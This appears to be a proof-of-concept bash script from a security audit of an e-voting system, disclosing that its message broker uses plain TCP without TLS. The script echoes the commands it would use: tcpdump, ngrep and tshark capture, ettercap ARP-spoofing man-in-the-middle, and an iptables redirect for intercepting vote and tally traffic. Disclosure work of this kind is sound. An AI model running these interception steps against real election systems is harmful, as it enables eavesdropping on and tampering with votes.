#!/bin/bash
# PoC: SP-010 — Message Broker Plain TCP (No TLS) Interception
#
# The Artemis message broker in the voting server deployment accepts
# connections on plain TCP without TLS encryption.
#
# broker.xml:142:
#   <acceptor name="node0">tcp://message-broker-1:61616</acceptor>
#
# This means all inter-component messaging (vote submissions,
# mixing operations, tally commands) traverse the network in
# cleartext, allowing:
#   1. Passive eavesdropping on election operations
#   2. Active MITM to modify messages in transit
#   3. Message injection/replay attacks
#
# The e2e-dev version uses RabbitMQ with BOTH:
#   - Port 5671 (TLS) — configured but optional
#   - Port 5672 (plain TCP) — also available
#
# Source:
#   e-voting/message-broker/node0/broker.xml:142
#   evoting-e2e-dev/message-broker/resources/rabbitmq.conf

echo "============================================================"
echo "SP-010: Message Broker Plain TCP Interception PoC"
echo "============================================================"
echo ""
echo "Broker configuration (broker.xml:142):"
echo '  <acceptor name="node0">'
echo '    tcp://message-broker-1:61616'
echo '  </acceptor>'
echo ""
echo "No TLS. No encryption. Plain TCP."
echo ""
echo "--- Passive Interception ---"
echo ""
echo "# On any host in the broker's network segment:"
echo "tcpdump -i eth0 -A port 61616 -w election_traffic.pcap"
echo ""
echo "# Or with ngrep for real-time message viewing:"
echo "ngrep -d eth0 -q '' port 61616"
echo ""
echo "# Filter for AMQP/STOMP protocol messages:"
echo "tshark -i eth0 -f 'port 61616' -Y 'amqp || stomp' -T fields \\"
echo "  -e amqp.method -e amqp.payload"
echo ""
echo "--- Active MITM (using ettercap or mitmproxy) ---"
echo ""
echo "# ARP spoofing + TCP interception:"
echo "ettercap -T -q -M arp:remote /message-broker-1// /voting-server//"
echo ""
echo "# Or with iptables + custom proxy:"
echo "iptables -t nat -A PREROUTING -p tcp --dport 61616 \\"
echo "  -j REDIRECT --to-port 61617"
echo ""
echo "Messages interceptable:"
echo "  - Vote submission payloads"
echo "  - Mixing operation commands"
echo "  - Tally initiation signals"
echo "  - Key ceremony coordination"
echo "  - Control component sync"
echo ""
echo "Impact: Complete compromise of message integrity"
echo "        between election system components."
